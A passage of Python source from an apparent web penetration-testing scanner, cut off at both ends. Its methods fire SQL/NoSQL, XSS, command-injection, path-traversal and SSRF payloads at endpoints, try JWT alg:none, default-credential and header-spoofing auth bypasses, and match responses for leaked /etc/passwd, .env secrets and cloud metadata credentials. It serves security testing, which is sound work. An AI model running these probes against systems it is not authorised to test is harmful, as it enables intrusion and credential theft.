        self.base_url = base_url.rstrip('/')
        self.timeout = timeout
        self.findings: List[PentestFinding] = []
        self.tests_run = 0
        self._finding_counter = 0
    
    def _next_finding_id(self) -> str:
        self._finding_counter += 1
        return f"PENTEST-{self._finding_counter:04d}"
    
    async def _request(self, method: str, path: str, headers: Dict = None, 
                       data: Any = None, json_data: Any = None,
                       params: Dict = None, allow_redirects: bool = True) -> Optional[Dict]:
        """Make an HTTP request and return response info."""
        url = f"{self.base_url}{path}"
        default_headers = {
            "User-Agent": "AltX-PenTest-Scanner/1.0",
            "Accept": "application/json, text/html, */*",
        }
        if headers:
            default_headers.update(headers)
        
        try:
            if HTTPX_AVAILABLE:
                async with httpx.AsyncClient(verify=False, timeout=self.timeout, follow_redirects=allow_redirects) as client:
                    response = await client.request(
                        method=method,
                        url=url,
                        headers=default_headers,
                        data=data,
                        json=json_data,
                        params=params
                    )
                    return {
                        "status_code": response.status_code,
                        "headers": dict(response.headers),
                        "body": response.text[:5000],  # Limit response body
                        "url": str(response.url),
                        "elapsed": response.elapsed.total_seconds() if hasattr(response, 'elapsed') else 0,
                    }
            elif REQUESTS_AVAILABLE:
                import requests
                response = requests.request(
                    method=method,
                    url=url,
                    headers=default_headers,
                    data=data,
                    json=json_data,
                    params=params,
                    verify=False,
                    timeout=self.timeout,
                    allow_redirects=allow_redirects
                )
                return {
                    "status_code": response.status_code,
                    "headers": dict(response.headers),
                    "body": response.text[:5000],
                    "url": response.url,
                    "elapsed": response.elapsed.total_seconds(),
                }
        except Exception as e:
            return {
                "status_code": 0,
                "headers": {},
                "body": str(e),
                "url": url,
                "elapsed": 0,
                "error": str(e)
            }
    
    # -------------------------------------------------------------------------
    # 1. SECURITY HEADERS TEST
    # -------------------------------------------------------------------------
    async def test_security_headers(self, endpoints: List[DiscoveredEndpoint]):
        """Test security headers on all discovered endpoints."""
        logger.info("Testing security headers...")
        
        # Test on a few representative endpoints
        test_paths = list(set(["/", "/health", "/api"] + [ep.path for ep in endpoints[:5]]))
        
        for path in test_paths:
            self.tests_run += 1
            resp = await self._request("GET", path)
            if not resp or resp.get("status_code", 0) == 0:
                continue
            
            headers = resp.get("headers", {})
            
            # Check missing required headers
            for header_name, info in SECURITY_HEADERS_CHECKS["required"].items():
                header_value = headers.get(header_name.lower()) or headers.get(header_name)
                if not header_value:
                    self.findings.append(PentestFinding(
                        id=self._next_finding_id(),
                        title=f"Missing {header_name} Header",
                        category=TestCategory.HEADER_SECURITY,
                        severity=info["severity"],
                        endpoint=path,
                        method="GET",
                        description=info["description"],
                        evidence=f"Response headers do not include '{header_name}'. Headers present: {', '.join(headers.keys())}",
                        response_code=resp["status_code"],
                        remediation=info["remediation"],
                        owasp_category="A05:2021 - Security Misconfiguration"
                    ))
                elif "expected" in info:
                    expected = info["expected"]
                    if isinstance(expected, list):
                        if header_value not in expected:
                            self.findings.append(PentestFinding(
                                id=self._next_finding_id(),
                                title=f"Weak {header_name} Header Value",
                                category=TestCategory.HEADER_SECURITY,
                                severity="Low",
                                endpoint=path,
                                method="GET",
                                description=f"{header_name} is set to '{header_value}' but expected one of: {expected}",
                                evidence=f"{header_name}: {header_value}",
                                response_code=resp["status_code"],
                                remediation=info["remediation"],
                                owasp_category="A05:2021 - Security Misconfiguration"
                            ))
                    elif header_value.lower() != expected.lower():
                        self.findings.append(PentestFinding(
                            id=self._next_finding_id(),
                            title=f"Weak {header_name} Header Value",
                            category=TestCategory.HEADER_SECURITY,
                            severity="Low",
                            endpoint=path,
                            method="GET",
                            description=f"{header_name} is set to '{header_value}' but expected '{expected}'",
                            evidence=f"{header_name}: {header_value}",
                            response_code=resp["status_code"],
                            remediation=info["remediation"],
                            owasp_category="A05:2021 - Security Misconfiguration"
                        ))
            
            # Check dangerous headers that reveal info
            for header_name, info in SECURITY_HEADERS_CHECKS["dangerous"].items():
                header_value = headers.get(header_name.lower()) or headers.get(header_name)
                if header_value:
                    self.findings.append(PentestFinding(
                        id=self._next_finding_id(),
                        title=f"Information Disclosure via {header_name}",
                        category=TestCategory.DATA_EXPOSURE,
                        severity=info["severity"],
                        endpoint=path,
                        method="GET",
                        description=info["description"],
                        evidence=f"{header_name}: {header_value}",
                        response_code=resp["status_code"],
                        remediation=info["remediation"],
                        owasp_category="A01:2021 - Broken Access Control"
                    ))
            
            break  # Only need to test headers on one endpoint
    
    # -------------------------------------------------------------------------
    # 2. SQL INJECTION TESTING
    # -------------------------------------------------------------------------
    async def test_sql_injection(self, endpoints: List[DiscoveredEndpoint]):
        """Test all endpoints for SQL injection vulnerabilities."""
        logger.info("Testing for SQL Injection...")
        
        for ep in endpoints:
            # Test query parameters
            for payload in SQL_INJECTION_PAYLOADS[:10]:  # Top 10 payloads
                self.tests_run += 1
                
                # Test in query params
                params = {}
                for param in ep.parameters:
                    if param["location"] == "query":
                        params[param["name"]] = payload
                
                if not params:
                    # Try common param names
                    params = {"id": payload, "q": payload, "search": payload}
                
                resp = await self._request(ep.method, ep.path, params=params)
                if resp and self._detect_sqli_response(resp, payload):
                    self.findings.append(PentestFinding(
                        id=self._next_finding_id(),
                        title=f"SQL Injection in {ep.path}",
                        category=TestCategory.INJECTION,
                        severity=Severity.CRITICAL,
                        endpoint=ep.path,
                        method=ep.method,
                        description=f"SQL injection vulnerability detected. The endpoint appears to be vulnerable to SQL injection attacks via query parameters.",
                        evidence=f"Payload: {payload}\nStatus: {resp['status_code']}\nResponse snippet: {resp['body'][:300]}",
                        payload_used=payload,
                        response_code=resp["status_code"],
                        response_snippet=resp["body"][:500],
                        remediation="Use parameterized queries (prepared statements). Never concatenate user input into SQL. Use an ORM.",
                        cwe_id="CWE-89",
                        owasp_category="A03:2021 - Injection",
                        cvss_score=9.8
                    ))
                    break  # One finding per endpoint is enough
                
                # Test in POST body
                if ep.method in ("POST", "PUT", "PATCH"):
                    body = {}
                    for param in ep.parameters:
                        if param["location"] == "body":
                            body[param["name"]] = payload
                    if not body:
                        body = {"username": payload, "email": payload, "search": payload, "query": payload}
                    
                    resp = await self._request(ep.method, ep.path, json_data=body)
                    if resp and self._detect_sqli_response(resp, payload):
                        self.findings.append(PentestFinding(
                            id=self._next_finding_id(),
                            title=f"SQL Injection in {ep.path} (POST Body)",
                            category=TestCategory.INJECTION,
                            severity=Severity.CRITICAL,
                            endpoint=ep.path,
                            method=ep.method,
                            description=f"SQL injection vulnerability detected in request body.",
                            evidence=f"Payload: {json.dumps(body)}\nStatus: {resp['status_code']}\nResponse: {resp['body'][:300]}",
                            payload_used=payload,
                            response_code=resp["status_code"],
                            response_snippet=resp["body"][:500],
                            remediation="Use parameterized queries. Validate and sanitize all input before database operations.",
                            cwe_id="CWE-89",
                            owasp_category="A03:2021 - Injection",
                            cvss_score=9.8
                        ))
                        break
    
    def _detect_sqli_response(self, resp: Dict, payload: str) -> bool:
        """Detect if a response indicates SQL injection vulnerability."""
        body = resp.get("body", "").lower()
        status = resp.get("status_code", 0)
        
        # SQL error signatures
        sql_errors = [
            "sql syntax", "mysql", "sqlite", "postgresql", "ora-", "oracle",
            "microsoft sql", "mssql", "unclosed quotation", "quoted string",
            "syntax error", "sql error", "database error", "db error",
            "unexpected end of sql", "unterminated string", "pg_query",
            "sqlstate", "pdo", "odbc", "jdbc", "invalid column",
            "column count", "table or view does not exist", "unknown column",
            "you have an error in your sql", "warning: mysql",
            "near \"'\":", "near \";\":", "union select",
        ]
        
        for error in sql_errors:
            if error in body:
                return True
        
        # Time-based detection (if we used SLEEP/WAITFOR)
        elapsed = resp.get("elapsed", 0)
        if "sleep" in payload.lower() or "waitfor" in payload.lower():
            if elapsed > 4.5:  # If response took > 4.5s on a SLEEP(5) payload
                return True
        
        # Boolean-based (comparison of AND 1=1 vs AND 1=2)
        if "and 1=1" in payload.lower() and status == 200:
            return False  # Need to compare with 1=2 response
        
        return False
    
    # -------------------------------------------------------------------------
    # 3. NOSQL INJECTION TESTING
    # -------------------------------------------------------------------------
    async def test_nosql_injection(self, endpoints: List[DiscoveredEndpoint]):
        """Test endpoints for NoSQL injection."""
        logger.info("Testing for NoSQL Injection...")
        
        for ep in endpoints:
            if ep.method not in ("POST", "PUT", "PATCH", "GET"):
                continue
            
            for payload_str in NOSQL_INJECTION_PAYLOADS:
                self.tests_run += 1
                try:
                    payload = json.loads(payload_str)
                except json.JSONDecodeError:
                    payload = payload_str
                
                if ep.method in ("POST", "PUT", "PATCH"):
                    body = {"username": payload, "password": payload}
                    resp = await self._request(ep.method, ep.path, json_data=body)
                else:
                    # For GET, try query params
                    resp = await self._request("GET", ep.path, params={"filter": payload_str})
                
                if resp and self._detect_nosqli_response(resp):
                    self.findings.append(PentestFinding(
                        id=self._next_finding_id(),
                        title=f"NoSQL Injection in {ep.path}",
                        category=TestCategory.INJECTION,
                        severity=Severity.HIGH,
                        endpoint=ep.path,
                        method=ep.method,
                        description="NoSQL injection vulnerability detected. Operators like $gt, $ne, $regex can be used to bypass authentication or extract data.",
                        evidence=f"Payload: {payload_str}\nStatus: {resp['status_code']}\nResponse: {resp['body'][:300]}",
                        payload_used=payload_str,
                        response_code=resp["status_code"],
                        response_snippet=resp["body"][:500],
                        remediation="Validate input types, reject objects with $ operators, use schema validation (e.g., Mongoose schema with strict mode).",
                        cwe_id="CWE-943",
                        owasp_category="A03:2021 - Injection",
                        cvss_score=8.1
                    ))
                    break
    
    def _detect_nosqli_response(self, resp: Dict) -> bool:
        """Detect if response indicates NoSQL injection success."""
        body = resp.get("body", "").lower()
        status = resp.get("status_code", 0)
        
        # If login-like endpoint returns 200 with session/token, likely bypassed
        if status == 200 and any(k in body for k in ["token", "session", "jwt", "access_token", "user", "admin"]):
            return True
        
        # MongoDB error messages
        mongo_errors = ["mongoerror", "bsontype", "cast to objectid", "castobjectid", "bson"]
        for err in mongo_errors:
            if err in body:
                return True
        
        return False
    
    # -------------------------------------------------------------------------
    # 4. XSS TESTING
    # -------------------------------------------------------------------------
    async def test_xss(self, endpoints: List[DiscoveredEndpoint]):
        """Test endpoints for Cross-Site Scripting."""
        logger.info("Testing for XSS...")
        
        for ep in endpoints:
            for payload in XSS_PAYLOADS[:8]:
                self.tests_run += 1
                
                # Test in query params
                resp = await self._request(ep.method, ep.path, params={"q": payload, "search": payload, "name": payload, "input": payload})
                
                if resp and self._detect_xss_response(resp, payload):
                    self.findings.append(PentestFinding(
                        id=self._next_finding_id(),
                        title=f"Cross-Site Scripting (XSS) in {ep.path}",
                        category=TestCategory.XSS,
                        severity=Severity.HIGH,
                        endpoint=ep.path,
                        method=ep.method,
                        description="Reflected XSS vulnerability detected. User input is reflected in the response without proper encoding/escaping.",
                        evidence=f"Payload: {payload}\nPayload reflected in response body without encoding.\nStatus: {resp['status_code']}",
                        payload_used=payload,
                        response_code=resp["status_code"],
                        response_snippet=resp["body"][:500],
                        remediation="Encode all user inputs before rendering. Use framework auto-escaping. Implement Content-Security-Policy headers.",
                        cwe_id="CWE-79",
                        owasp_category="A03:2021 - Injection",
                        cvss_score=6.1
                    ))
                    break
                
                # Test in POST body
                if ep.method in ("POST", "PUT", "PATCH"):
                    body = {"name": payload, "content": payload, "message": payload, "text": payload}
                    resp = await self._request(ep.method, ep.path, json_data=body)
                    if resp and self._detect_xss_response(resp, payload):
                        self.findings.append(PentestFinding(
                            id=self._next_finding_id(),
                            title=f"Stored XSS in {ep.path}",
                            category=TestCategory.XSS,
                            severity=Severity.HIGH,
                            endpoint=ep.path,
                            method=ep.method,
                            description="Potential stored XSS vulnerability. Payload accepted and may be reflected when data is displayed.",
                            evidence=f"Payload: {payload}\nAccepted in POST body.\nStatus: {resp['status_code']}",
                            payload_used=payload,
                            response_code=resp["status_code"],
                            response_snippet=resp["body"][:500],
                            remediation="Sanitize all user inputs on server-side. Use DOMPurify for HTML rendering. Set CSP headers.",
                            cwe_id="CWE-79",
                            owasp_category="A03:2021 - Injection",
                            cvss_score=7.2
                        ))
                        break
    
    def _detect_xss_response(self, resp: Dict, payload: str) -> bool:
        """Detect if XSS payload is reflected in response."""
        body = resp.get("body", "")
        # Check if payload is present in response unencoded
        if payload in body:
            return True
        # Check partial reflection
        dangerous_parts = ['<script>', 'onerror=', 'onload=', 'alert(', 'javascript:']
        for part in dangerous_parts:
            if part in payload.lower() and part in body.lower():
                return True
        return False
    
    # -------------------------------------------------------------------------
    # 5. COMMAND INJECTION TESTING
    # -------------------------------------------------------------------------
    async def test_command_injection(self, endpoints: List[DiscoveredEndpoint]):
        """Test for OS command injection."""
        logger.info("Testing for Command Injection...")
        
        for ep in endpoints:
            for payload in COMMAND_INJECTION_PAYLOADS[:8]:
                self.tests_run += 1
                
                params = {"cmd": payload, "command": payload, "exec": payload, "file": payload, "path": payload, "url": payload}
                resp = await self._request(ep.method, ep.path, params=params)
                
                if resp and self._detect_cmdi_response(resp, payload):
                    self.findings.append(PentestFinding(
                        id=self._next_finding_id(),
                        title=f"Command Injection in {ep.path}",
                        category=TestCategory.INJECTION,
                        severity=Severity.CRITICAL,
                        endpoint=ep.path,
                        method=ep.method,
                        description="OS command injection vulnerability detected. Arbitrary commands can be executed on the server.",
                        evidence=f"Payload: {payload}\nCommand output detected in response.\nStatus: {resp['status_code']}\nResponse: {resp['body'][:300]}",
                        payload_used=payload,
                        response_code=resp["status_code"],
                        response_snippet=resp["body"][:500],
                        remediation="Never pass user input to shell commands. Use subprocess with a list of arguments (not shell=True). Validate inputs against allowlists.",
                        cwe_id="CWE-78",
                        owasp_category="A03:2021 - Injection",
                        cvss_score=9.8
                    ))
                    break
                
                if ep.method in ("POST", "PUT", "PATCH"):
                    body = {"filename": payload, "path": payload, "url": payload, "target": payload}
                    resp = await self._request(ep.method, ep.path, json_data=body)
                    if resp and self._detect_cmdi_response(resp, payload):
                        self.findings.append(PentestFinding(
                            id=self._next_finding_id(),
                            title=f"Command Injection in {ep.path} (POST)",
                            category=TestCategory.INJECTION,
                            severity=Severity.CRITICAL,
                            endpoint=ep.path,
                            method=ep.method,
                            description="OS command injection via POST body.",
                            evidence=f"Payload: {json.dumps(body)}\nStatus: {resp['status_code']}\nResponse: {resp['body'][:300]}",
                            payload_used=payload,
                            response_code=resp["status_code"],
                            response_snippet=resp["body"][:500],
                            remediation="Avoid shell=True in subprocess. Use allowlists for valid inputs.",
                            cwe_id="CWE-78",
                            owasp_category="A03:2021 - Injection",
                            cvss_score=9.8
                        ))
                        break
    
    def _detect_cmdi_response(self, resp: Dict, payload: str) -> bool:
        """Detect command injection based on response."""
        body = resp.get("body", "").lower()
        elapsed = resp.get("elapsed", 0)
        
        # Check for command output indicators
        indicators = [
            "root:", "uid=", "gid=", "groups=",  # Linux user info
            "total ", "drwx", "-rwx",  # ls output
            "/bin/", "/usr/", "/etc/",  # Path output
            "windows", "system32",  # Windows output
            "volume serial", "directory of",  # Windows dir
        ]
        
        for indicator in indicators:
            if indicator in body:
                return True
        
        # Time-based detection
        if "sleep" in payload.lower() and elapsed > 4.5:
            return True
        
        return False
    
    # -------------------------------------------------------------------------
    # 6. PATH TRAVERSAL TESTING
    # -------------------------------------------------------------------------
    async def test_path_traversal(self, endpoints: List[DiscoveredEndpoint]):
        """Test for path traversal / directory traversal."""
        logger.info("Testing for Path Traversal...")
        
        for ep in endpoints:
            # Test endpoints that take file-like parameters
            for payload in PATH_TRAVERSAL_PAYLOADS[:10]:
                self.tests_run += 1
                
                params = {"file": payload, "path": payload, "page": payload, "doc": payload,
                         "filename": payload, "template": payload, "include": payload}
                resp = await self._request("GET", ep.path, params=params)
                
                if resp and self._detect_path_traversal(resp):
                    self.findings.append(PentestFinding(
                        id=self._next_finding_id(),
                        title=f"Path Traversal in {ep.path}",
                        category=TestCategory.PATH_TRAVERSAL,
                        severity=Severity.HIGH,
                        endpoint=ep.path,
                        method="GET",
                        description="Path traversal vulnerability allows reading arbitrary files from the server filesystem.",
                        evidence=f"Payload: {payload}\nSensitive file content detected in response.\nStatus: {resp['status_code']}\nResponse: {resp['body'][:300]}",
                        payload_used=payload,
                        response_code=resp["status_code"],
                        response_snippet=resp["body"][:500],
                        remediation="Use allowlists for file access. Resolve canonical paths and verify they stay within allowed directory. Never use raw user input in file paths.",
                        cwe_id="CWE-22",
                        owasp_category="A01:2021 - Broken Access Control",
                        cvss_score=7.5
                    ))
                    break
    
    def _detect_path_traversal(self, resp: Dict) -> bool:
        """Detect path traversal success."""
        body = resp.get("body", "")
        status = resp.get("status_code", 0)
        
        if status != 200:
            return False
        
        indicators = [
            "root:", "/bin/bash", "/bin/sh",  # /etc/passwd
            "[extensions]", "[boot loader]",  # Windows config files
            "SECRET_KEY", "DATABASE_URL", "AWS_",  # .env files
            "DB_PASSWORD", "API_KEY",
        ]
        
        for indicator in indicators:
            if indicator in body:
                return True
        
        return False
    
    # -------------------------------------------------------------------------
    # 7. SSRF TESTING
    # -------------------------------------------------------------------------
    async def test_ssrf(self, endpoints: List[DiscoveredEndpoint]):
        """Test for Server-Side Request Forgery."""
        logger.info("Testing for SSRF...")
        
        for ep in endpoints:
            for payload in SSRF_PAYLOADS[:8]:
                self.tests_run += 1
                
                params = {"url": payload, "target": payload, "dest": payload,
                         "redirect": payload, "uri": payload, "link": payload,
                         "src": payload, "source": payload, "webhook": payload}
                
                resp = await self._request(ep.method, ep.path, params=params)
                
                if resp and self._detect_ssrf(resp, payload):
                    self.findings.append(PentestFinding(
                        id=self._next_finding_id(),
                        title=f"SSRF in {ep.path}",
                        category=TestCategory.SSRF,
                        severity=Severity.HIGH if "169.254" in payload else Severity.MEDIUM,
                        endpoint=ep.path,
                        method=ep.method,
                        description="Server-Side Request Forgery allows an attacker to make the server send requests to internal resources or cloud metadata endpoints.",
                        evidence=f"Payload: {payload}\nInternal content or metadata detected.\nStatus: {resp['status_code']}\nResponse: {resp['body'][:300]}",
                        payload_used=payload,
                        response_code=resp["status_code"],
                        response_snippet=resp["body"][:500],
                        remediation="Validate and whitelist URLs. Block requests to internal/private IP ranges. Use network segmentation.",
                        cwe_id="CWE-918",
                        owasp_category="A10:2021 - Server-Side Request Forgery",
                        cvss_score=7.5
                    ))
                    break
                
                if ep.method in ("POST", "PUT", "PATCH"):
                    body = {"url": payload, "webhook_url": payload, "callback": payload, "target_url": payload}
                    resp = await self._request(ep.method, ep.path, json_data=body)
                    if resp and self._detect_ssrf(resp, payload):
                        self.findings.append(PentestFinding(
                            id=self._next_finding_id(),
                            title=f"SSRF in {ep.path} (POST)",
                            category=TestCategory.SSRF,
                            severity=Severity.HIGH,
                            endpoint=ep.path,
                            method=ep.method,
                            description="SSRF via POST body - server makes requests to attacker-controlled URLs.",
                            evidence=f"Payload: {json.dumps(body)}\nStatus: {resp['status_code']}",
                            payload_used=payload,
                            response_code=resp["status_code"],
                            remediation="Whitelist allowed URL schemes and destinations. Use DNS resolution checks.",
                            cwe_id="CWE-918",
                            owasp_category="A10:2021 - SSRF",
                            cvss_score=7.5
                        ))
                        break
    
    def _detect_ssrf(self, resp: Dict, payload: str) -> bool:
        """Detect SSRF success."""
        body = resp.get("body", "").lower()
        status = resp.get("status_code", 0)
        
        if status != 200:
            return False
        
        # AWS metadata indicators
        if "169.254" in payload and any(k in body for k in ["ami-id", "instance-id", "security-credentials", "iam", "instance-type"]):
            return True
        
        # GCP metadata
        if "metadata.google" in payload and any(k in body for k in ["project-id", "service-accounts", "computeMetadata"]):
            return True
        
        # Internal service response indicators
        if "localhost" in payload or "127.0.0.1" in payload:
            if status == 200 and len(body) > 10:
                # Check if we got internal service data
                if any(k in body for k in ["redis", "memcache", "stats", "connected_clients", "uptime"]):
                    return True
        
        return False
    
    # -------------------------------------------------------------------------
    # 8. AUTHENTICATION BYPASS TESTING
    # -------------------------------------------------------------------------
    async def test_auth_bypass(self, endpoints: List[DiscoveredEndpoint]):
        """Test for authentication bypass vulnerabilities."""
        logger.info("Testing for Authentication Bypass...")
        
        # Find auth-protected endpoints
        auth_endpoints = [ep for ep in endpoints if ep.auth_required]
        
        # If no auth endpoints detected, test common protected paths
        if not auth_endpoints:
            common_auth_paths = ["/api/users", "/api/profile", "/api/admin", "/api/dashboard",
                               "/api/settings", "/api/account", "/users/me", "/me", "/profile"]
            for path in common_auth_paths:
                auth_endpoints.append(DiscoveredEndpoint(
                    method="GET", path=path, file="inferred", line=0, auth_required=True
                ))
        
        for ep in auth_endpoints:
            # Test 1: Access without any auth header
            self.tests_run += 1
            resp = await self._request(ep.method, ep.path)
            if resp and resp.get("status_code") == 200:
                body = resp.get("body", "")
                if len(body) > 20 and "unauthorized" not in body.lower() and "forbidden" not in body.lower():
                    self.findings.append(PentestFinding(
                        id=self._next_finding_id(),
                        title=f"Missing Authentication on {ep.path}",
                        category=TestCategory.AUTH_BYPASS,
                        severity=Severity.CRITICAL,
                        endpoint=ep.path,
                        method=ep.method,
                        description="Protected endpoint accessible without any authentication. No auth token required.",
                        evidence=f"Accessed {ep.path} without auth headers.\nStatus: 200\nResponse: {body[:300]}",
                        response_code=200,
                        response_snippet=body[:500],
                        remediation="Implement authentication middleware on all protected routes. Verify JWT/session tokens before granting access.",
                        cwe_id="CWE-306",
                        owasp_category="A07:2021 - Identification and Authentication Failures",
                        cvss_score=9.1
                    ))
            
            # Test 2: JWT None Algorithm Attack
            self.tests_run += 1
            jwt_none = AUTH_BYPASS_PAYLOADS["jwt_none_alg"]
            resp = await self._request(ep.method, ep.path, headers=jwt_none["headers"])
            if resp and resp.get("status_code") == 200:
                body = resp.get("body", "")
                if len(body) > 20 and "unauthorized" not in body.lower() and "invalid" not in body.lower():
                    self.findings.append(PentestFinding(
                        id=self._next_finding_id(),
                        title=f"JWT None Algorithm Bypass on {ep.path}",
                        category=TestCategory.AUTH_BYPASS,
                        severity=Severity.CRITICAL,
                        endpoint=ep.path,
                        method=ep.method,
                        description="JWT token with Algorithm 'none' was accepted. This allows forging any JWT token without the signing secret.",
                        evidence=f"JWT with alg:none accepted.\nHeaders: {json.dumps(jwt_none['headers'])}\nStatus: 200\nResponse: {body[:300]}",
                        payload_used=jwt_none["headers"]["Authorization"],
                        response_code=200,
                        response_snippet=body[:500],
                        remediation="Explicitly reject JWT tokens with alg='none'. Always verify the algorithm matches expected (e.g., HS256, RS256).",
                        cwe_id="CWE-287",
                        owasp_category="A07:2021 - Identification and Authentication Failures",
                        cvss_score=9.8
                    ))
            
            # Test 3: Empty JWT token
            self.tests_run += 1
            empty_jwt = AUTH_BYPASS_PAYLOADS["jwt_empty"]
            resp = await self._request(ep.method, ep.path, headers=empty_jwt["headers"])
            if resp and resp.get("status_code") == 200:
                body = resp.get("body", "")
                if len(body) > 20 and "unauthorized" not in body.lower():
                    self.findings.append(PentestFinding(
                        id=self._next_finding_id(),
                        title=f"Empty JWT Token Accepted on {ep.path}",
                        category=TestCategory.AUTH_BYPASS,
                        severity=Severity.HIGH,
                        endpoint=ep.path,
                        method=ep.method,
                        description="An empty Bearer token was accepted, bypassing authentication.",
                        evidence=f"Empty Authorization: Bearer header accepted.\nStatus: 200",
                        response_code=200,
                        remediation="Validate that JWT tokens are non-empty and properly structured before processing.",
                        cwe_id="CWE-287",
                        owasp_category="A07:2021 - Identification and Authentication Failures",
                        cvss_score=8.5
                    ))
            
            # Test 4: Malformed JWT
            self.tests_run += 1
            malformed_jwt = AUTH_BYPASS_PAYLOADS["jwt_malformed"]
            resp = await self._request(ep.method, ep.path, headers=malformed_jwt["headers"])
            if resp and resp.get("status_code") == 200:
                body = resp.get("body", "")
                if len(body) > 20 and "unauthorized" not in body.lower():
                    self.findings.append(PentestFinding(
                        id=self._next_finding_id(),
                        title=f"Malformed JWT Accepted on {ep.path}",
                        category=TestCategory.AUTH_BYPASS,
                        severity=Severity.HIGH,
                        endpoint=ep.path,
                        method=ep.method,
                        description="A malformed JWT 'xxx.yyy.zzz' was accepted without proper validation.",
                        evidence=f"Malformed JWT accepted.\nStatus: 200",
                        response_code=200,
                        remediation="Implement strict JWT validation including signature verification, expiry checks, and format validation.",
                        cwe_id="CWE-287",
                        owasp_category="A07:2021 - Identification and Authentication Failures",
                        cvss_score=8.5
                    ))
            
            # Test 5: Default credentials (on login endpoints)
            if any(kw in ep.path.lower() for kw in ["login", "auth", "signin", "token"]):
                cred_list = AUTH_BYPASS_PAYLOADS["basic_auth_default"]["credentials"]
                for username, password in cred_list[:8]:
                    self.tests_run += 1
                    body = {"username": username, "password": password, "email": f"{username}@test.com"}
                    resp = await self._request("POST", ep.path, json_data=body)
                    if resp and resp.get("status_code") == 200:
                        resp_body = resp.get("body", "")
                        if any(k in resp_body.lower() for k in ["token", "session", "jwt", "access_token", "logged_in", "success"]):
                            self.findings.append(PentestFinding(
                                id=self._next_finding_id(),
                                title=f"Default Credentials Accepted ({username}:{password})",
                                category=TestCategory.AUTH_BYPASS,
                                severity=Severity.CRITICAL,
                                endpoint=ep.path,
                                method="POST",
                                description=f"Default/common credentials '{username}:{password}' were accepted for authentication.",
                                evidence=f"Credentials: {username}:{password}\nLogin successful.\nStatus: 200\nResponse: {resp_body[:300]}",
                                payload_used=f"{username}:{password}",
                                response_code=200,
                                response_snippet=resp_body[:500],
                                remediation="Remove default accounts. Enforce strong password policies. Implement account lockout after failed attempts.",
                                cwe_id="CWE-798",
                                owasp_category="A07:2021 - Identification and Authentication Failures",
                                cvss_score=9.8
                            ))
                            break
            
            # Test 6: Header manipulation bypass
            for headers_dict in AUTH_BYPASS_PAYLOADS["header_manipulation"]["headers_list"][:6]:
                self.tests_run += 1
                resp = await self._request(ep.method, ep.path, headers=headers_dict)
                if resp and resp.get("status_code") == 200:
                    body = resp.get("body", "")
                    if len(body) > 20 and "unauthorized" not in body.lower() and "forbidden" not in body.lower():
                        header_name = list(headers_dict.keys())[0]
                        self.findings.append(PentestFinding(
                            id=self._next_finding_id(),
                            title=f"Auth Bypass via {header_name}",
                            category=TestCategory.AUTH_BYPASS,
                            severity=Severity.HIGH,
                            endpoint=ep.path,
                            method=ep.method,
                            description=f"Authentication bypassed using header {header_name}: {headers_dict[header_name]}. The application trusts client-supplied headers for authorization.",
                            evidence=f"Header: {json.dumps(headers_dict)}\nStatus: 200\nResponse: {body[:300]}",
                            payload_used=json.dumps(headers_dict),
                            response_code=200,
                            response_snippet=body[:500],
                            remediation=f"Do not trust {header_name} header for authentication. Always verify auth tokens server-side.",
                            cwe_id="CWE-290",
                            owasp_category="A07:2021 - Identification and Authentication Failures",
                            cvss_score=8.0
                        ))
                        break
    
    # -------------------------------------------------------------------------
    # 9. AUTHORIZATION BYPASS / IDOR TESTING
    # -------------------------------------------------------------------------
    async def test_authorization_bypass(self, endpoints: List[DiscoveredEndpoint]):
        """Test for authorization bypass and IDOR vulnerabilities."""
        logger.info("Testing for Authorization Bypass / IDOR...")
        
        # Test 1: Forced browsing to admin/debug endpoints
        for admin_path in AUTHORIZATION_BYPASS_TESTS["forced_browsing"]:
            self.tests_run += 1
            resp = await self._request("GET", admin_path)
            
            if resp and resp.get("status_code") == 200:
                body = resp.get("body", "")
                if len(body) > 30 and all(k not in body.lower() for k in ["unauthorized", "forbidden", "not found", "404", "login"]):
                    # Determine severity based on path
                    if any(k in admin_path for k in ["/admin", "/.env", "/config", "/actuator/env", "/debug"]):
                        severity = Severity.CRITICAL
                    elif any(k in admin_path for k in ["/swagger", "/docs", "/graphql", "/metrics"]):
                        severity = Severity.MEDIUM
                    else:
                        severity = Severity.LOW
                    
                    self.findings.append(PentestFinding(
                        id=self._next_finding_id(),
                        title=f"Unauthorized Access to {admin_path}",
                        category=TestCategory.AUTHZ_BYPASS,
                        severity=severity,
                        endpoint=admin_path,
                        method="GET",
                        description=f"Sensitive endpoint '{admin_path}' is accessible without authorization. This could expose administrative functions, configuration data, or API documentation.",
                        evidence=f"GET {admin_path} returned 200 OK\nResponse length: {len(body)} chars\nSnippet: {body[:300]}",
                        response_code=200,
                        response_snippet=body[:500],
                        remediation="Implement proper access control. Restrict admin endpoints to authenticated administrators only. Disable debug endpoints in production.",
                        cwe_id="CWE-862",
                        owasp_category="A01:2021 - Broken Access Control",
                        cvss_score=7.5 if severity == Severity.CRITICAL else 5.0
                    ))
        
        # Test 2: IDOR - Object reference manipulation
        for ep in endpoints:
            # Check if endpoint has ID-like path parameters
            if re.search(r'/\{[\w_]*id\}|/:\w*id|/\d+', ep.path, re.IGNORECASE):
                for idor_test in AUTHORIZATION_BYPASS_TESTS["idor_patterns"]:
                    pattern = idor_test["replace_pattern"]
                    if re.search(pattern, ep.path, re.IGNORECASE):
                        for replacement in idor_test["replace_with"]:
                            self.tests_run += 1
                            test_path = re.sub(pattern, replacement, ep.path, flags=re.IGNORECASE)
                            resp = await self._request(ep.method, test_path)
                            
                            if resp and resp.get("status_code") == 200:
                                body = resp.get("body", "")
                                if len(body) > 30 and "not found" not in body.lower():
                                    self.findings.append(PentestFinding(
                                        id=self._next_finding_id(),
                                        title=f"IDOR: Accessing {test_path} from {ep.path}",
                                        category=TestCategory.IDOR,
                                        severity=Severity.HIGH,
                                        endpoint=test_path,
                                        method=ep.method,
                                        description=f"Insecure Direct Object Reference (IDOR) detected. By changing the ID in the URL from the original to '{replacement}', another user's data may be accessible.",
                                        evidence=f"Original: {ep.path}\nModified: {test_path}\nStatus: 200\nResponse: {body[:300]}",
                                        response_code=200,
                                        response_snippet=body[:500],
                                        remediation="Implement proper authorization checks. Verify the authenticated user has permission to access the requested resource.",
                                        cwe_id="CWE-639",
                                        owasp_category="A01:2021 - Broken Access Control",
                                        cvss_score=7.5
                                    ))
                                    break
        
        # Test 3: Privilege escalation via role parameters
        priv_esc = AUTHORIZATION_BYPASS_TESTS["privilege_escalation"]
        for ep in endpoints:
            if ep.method in ("POST", "PUT", "PATCH"):
                for role_body in priv_esc["role_bodies"][:4]:
                    self.tests_run += 1
